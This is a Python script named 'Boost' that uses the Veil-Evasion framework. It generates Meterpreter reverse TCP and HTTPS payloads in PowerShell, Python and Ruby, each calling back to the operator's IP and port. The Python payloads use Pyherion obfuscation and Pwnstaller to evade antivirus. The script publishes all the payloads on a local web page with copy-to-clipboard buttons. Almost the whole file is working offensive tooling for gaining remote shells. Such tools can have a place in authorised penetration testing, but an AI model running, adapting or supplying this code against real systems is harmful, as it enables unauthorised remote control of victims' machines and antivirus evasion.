#!/usr/bin/env python

import os
import sys
import socket
import fcntl
import struct
import argparse
import datetime
import re

if os.path.isfile('/etc/veil/settings.py'):
	try: 
		sys.path.append("/etc/veil/")
		import settings as VeilSettings
		sys.path.append(VeilSettings.VEIL_EVASION_PATH)

		# import controller module
		from modules.common import controller as VeilController

	except:
		print "Somthing went wrong with the veil configuration."
		sys.exit(0) # Check for Veil installation and import if present
else:
	print "Veil is not installed, or the configuration file does not exist."
	print "Please ensure that the configuration file /etc/veil/settings.py has been created."

# Build namespaces to pass args to Veil functions
class Namespace:
	def __init__(self, **kwargs):
		self.__dict__.update(kwargs)

def isIPValid(address): # WORKING  Citation: Maria Zverina http://stackoverflow.com/a/11264379
	try:
		host_bytes = address.split('.')
		valid = [int(b) for b in host_bytes]
		valid = [b for b in valid if b >= 0 and b<=255]
		return len(host_bytes) == 4 and len(valid) == 4
	except:
		return False

def findIP(interface): # WORKING
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		ip = socket.inet_ntoa(fcntl.ioctl(
			s.fileno(),
			0x8915, # SIOCGIFADDR
			struct.pack('256s', interface[:15])
			)[20:24])
		return ip
	except:
		print "ERROR: No IP Address Assigned.\n\n Make sure " + str(interface) + " has an IP configured."
		sys.exit(1)



def BuildVeilTCP(LHOST, LPORT, outputbasename, lang, pwnstaller=True, overwrite=True, **kwargs): # IMPLEMENT
	'''
	kwargs:

	'''

	# Instantiate the controller
	controller = VeilController.Controller(oneRun=True)	

	# Build the options dictionaries. 
	options = {}
	options['required_options'] = {}

	# Set the options per language.
	if str.lower(lang) == 'python':
		print "Using python"
		options['required_options']['ARCHITECTURE'] = ['32', ""]
		options['required_options']['COMPILE_TO_EXE'] = ['Y', ""]
		options['required_options']['EXPIRE_PAYLOAD'] = ['X', ""]
		options['required_options']['LHOST'] = [LHOST, ""]
		options['required_options']['LPORT'] = [LPORT, ""]
		options['required_options']['USE_PYHERION'] = ['Y', ""]
		args = Namespace(o=outputbasename + "p", pwnstaller=pwnstaller, overwrite=overwrite)
		controller.SetPayload('python/meterpreter/rev_tcp', options)
	elif str.lower(lang) == 'ruby':
		print "Using Ruby"
		options['required_options']['LHOST'] = [LHOST, ""]
		options['required_options']['LPORT'] = [LPORT, ""]
		args = Namespace(o=outputbasename + "r", pwnstaller=False, overwrite=overwrite)
		controller.SetPayload('ruby/meterpreter/rev_tcp', options)

	elif str.lower(lang) == 'powershell':
		# Add logic.
		print "Using powershell"
		options['required_options']['LHOST'] = [LHOST, ""]
		options['required_options']['LPORT'] = [LPORT, ""]
		args = Namespace(o=outputbasename + "p", pwnstaller=False, overwrite=overwrite)
		controller.SetPayload('powershell/meterpreter/rev_tcp', options)
	# Continue to add more languages here.

	else:
		print "BuildVeilTCP: Error - Invalid lang setting."

	# Generate the payload
	payloadcode = controller.GeneratePayload()

	# Gotta change into the Veil-Evasion directory. Save current working dir, change, then change back.
	workingdirectory = os.getcwd()
	os.chdir(VeilSettings.VEIL_EVASION_PATH)
	outFile = controller.OutputMenu(controller.payload, payloadcode, showTitle=False, interactive=False, args=args)

	# Changing back
	os.chdir(workingdirectory)
	if str.lower(lang) == 'powershell':
		f = open(outFile, 'r')
		fr = f.read()
		f.close()
		print fr + "\n"
		return fr # outFile
	return outFile

def BuildVeilHTTPS(LHOST, LPORT, outputbasename, lang, pwnstaller=True, overwrite=True,  **kwargs): # IMPLEMENT

	# Instantiate the controller
	controller = VeilController.Controller(oneRun=True)	

	# Build the options dictionaries. 
	options = {}
	options['required_options'] = {}

	# Set the options per language.
	if str.lower(lang) == 'python':
		print "Using python"
		options['required_options']['ARCHITECTURE'] = ['32', ""]
		options['required_options']['COMPILE_TO_EXE'] = ['Y', ""]
		options['required_options']['EXPIRE_PAYLOAD'] = ['X', ""]
		options['required_options']['LHOST'] = [LHOST, ""]
		options['required_options']['LPORT'] = [LPORT, ""]
		options['required_options']['USE_PYHERION'] = ['Y', ""]
		args = Namespace(o=outputbasename + "p", pwnstaller=pwnstaller, overwrite=overwrite)
		controller.SetPayload('python/meterpreter/rev_https', options)
	elif str.lower(lang) == 'ruby':
		print "Using Ruby"
		options['required_options']['LHOST'] = [LHOST, ""]
		options['required_options']['LPORT'] = [LPORT, ""]
		args = Namespace(o=outputbasename + "r", pwnstaller=pwnstaller, overwrite=overwrite)
		controller.SetPayload('ruby/meterpreter/rev_https', options)	
	
	elif str.lower(lang) == 'powershell':
		# Add logic.
		print "Using powershell"
		options['required_options']['LHOST'] = [LHOST, ""]
		options['required_options']['LPORT'] = [LPORT, ""]
		args = Namespace(o=outputbasename + "p", pwnstaller=False, overwrite=overwrite)
		controller.SetPayload('powershell/meterpreter/rev_https', options)
	# Continue to add more languages here.

	else:
		print "BuildVeilHTTPS: Error - Invalid lang setting."
		return

	# Generate the payload
	payloadcode = controller.GeneratePayload()

	# Gotta change into the Veil-Evasion directory. Save current working dir, change, then change back.
	workingdirectory = os.getcwd()
	os.chdir(VeilSettings.VEIL_EVASION_PATH)
	outFile = controller.OutputMenu(controller.payload, payloadcode, showTitle=False, interactive=False, args=args)

	# Changing back
	os.chdir(workingdirectory)
	if str.lower(lang) == 'powershell':
		f = open(outFile, 'r')
		fr = f.read()
		f.close()
		print fr + "\n"
		return fr # outFile

	return outFile


def BuildHTTPPage(LHOST, LPORT): # Building
	# Build exploit function
	def exploit(title, id, d):
		r = '<div class="outer-container">\n'
		r += '<h2>' + title + '</h2>\n'
		r += '<div id="' + id + '" class="accordian-body collapse">\n'
		r += '<div class="preformatted">'
		r += d + "\n"
		r += '</div></div>\n'
		r += '<BUTTON type="button" onClick="ClipBoard();">Copy to Clipboard</button>\n'
		r += '<BUTTON data-toggle="collapse" data-target="#' + id + '"> Hide/Show </button>\n'
		r += '</div>\n'
		return r

	# Set outbase name for payloads based on current days date.
	today = datetime.date.today()
	outputbase = str(today.strftime('%Y%m%d'))

	# Build payloads
	tcp_ps = BuildVeilTCP(LHOST, LPORT, outputbase + 'tcp', lang='powershell', pwnstaller=True, overwrite=True)
	tcp_python = BuildVeilTCP(LHOST, LPORT, outputbase + 'tcp', lang='python', pwnstaller=True, overwrite=True)
	tcp_ruby = BuildVeilTCP(LHOST, LPORT, outputbase + 'tcp', lang='ruby', pwnstaller=True, overwrite=True)
	https_ps = BuildVeilHTTPS(LHOST, LPORT, outputbase + 'https', lang='powershell', pwnstaller=True, overwrite=True)
	https_python = BuildVeilHTTPS(LHOST, LPORT, outputbase + 'https', lang='python', pwnstaller=True, overwrite=True)
	https_ruby = BuildVeilHTTPS(LHOST, LPORT, outputbase + 'https', lang='ruby', pwnstaller=True, overwrite=True)
	

	# Build HTTP Header
	http = '<!DOCTYPE html>\n'
	http += '<html>\n'
	http += '<head>\n'
	http += '\t<title>PROJECT BOOST</title>\n'
	http += '\t<meta name="viewport" content="width=device-width, initial-scale=1">\n'
	http += '\t<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">\n'
	http += '\t<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>\n'
	http += '\t<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>\n'
	http += '</head>\n'
	http += '<style>\n'
	http += '.preformatted {\n'
	http += '\tfont-family: monospace;\n'
	http += '\twhite-space: pre-wrap;\n'
	http += '\tword-wrap: break-word;\n'
	http += '\tfont-size: 50%;\n'
	http += '\talign: center;\n'
	http += '\twidth: 90%;\n' # Width of page
	http += '\tmargin: 2% auto;\n' # Margin from corner to div
	http += '\tpadding: 1%;\n' # Padding inside div.
	http += '\tborder: 1px solid black;\n'
	http += '}\n'
	http += '.outer-container {\n'
	http += '\twidth: 90%;\n' # Width of page
	http += '\tmargin: 2%;\n' # Margin from corner to div
	#http += '\tmargin-right: 5%;\n'
	http += '\tpadding: 1%;\n' # Padding inside div.
	http += '}\n'

	http += '</style>\n'

	# Build HTTP Body
	http += '<body>\n'
	http += 'IP Address: ' + str(LHOST) + '<br>\n'
	http += 'Port:       ' + str(LPORT) + '<br>\n'

	http += exploit('Veil Powershell TCP', 'VeilPSTCP', tcp_ps)
	http += exploit('Veil Python TCP', 'VeilPYTCP', tcp_python)
	http += exploit('Veil Ruby TCP', 'VeilRubyTCP', tcp_ruby)
	http += exploit('Veil Powershell HTTPS', 'VeilPSHTTPS', https_ps)
	http += exploit('Veil Python HTTPS', 'VeilPYHTTPS', https_python)
	http += exploit('Veil Ruby HTTPS', 'VeilRubyHTTPS', https_ruby)

	# Finish the file.
	http += '<h6>This file generated at : '
	http += str(datetime.datetime.now())
	http += ' </h6>\n'
	http += '</body>\n'
	http += '</html>\n'

	return http


def main():

	# Argument Parser
	try:
		parser = argparse.ArgumentParser(
			prog="Boost", 
			description="Boost Script", 
			epilog="Build the exploit environment.",
			formatter_class=argparse.RawTextHelpFormatter,
			)
		APRequiredGroup = parser.add_argument_group('General Program Options', 'General Configuration')
		APOptionalGroup = parser.add_argument_group('Optional Options', 'Optional Options')

		# Add arguments to the general group
		APRequiredGroup.add_argument('-i', '--interface', help="Interface the handler is on.")
		APRequiredGroup.add_argument('-p', '--port', help="Port the handler is listening on.")

		# Add arguments to the optional group
		APOptionalGroup.add_argument('-v', "--verbose", help="More verbose output.")
		# Generate argument parser.
		options = parser.parse_args()# Build argument parser.
	except: 
		print "Argument Parser: Somthing went wrong. Check flags."
		sys.exit(1)# If Argparse fails, quit.

	# Check for null command line
	if not any([options.interface]) or not any([options.port]):
		parser.print_help()
	 	sys.exit(1)


	print "Now trying to write it to a file."
	f = open('/var/www/html/indextesting.html', 'w')
	f.write(BuildHTTPPage(findIP(options.interface), options.port))
	f.close()
	# f = open('/var/www/html/indextesting.html', 'r')
	# print f.read()
	# f.close()
	# print os.path.isfile('/var/www/html/indextesting.html')
	# print "Testing finished."


if __name__ == '__main__':
	main()
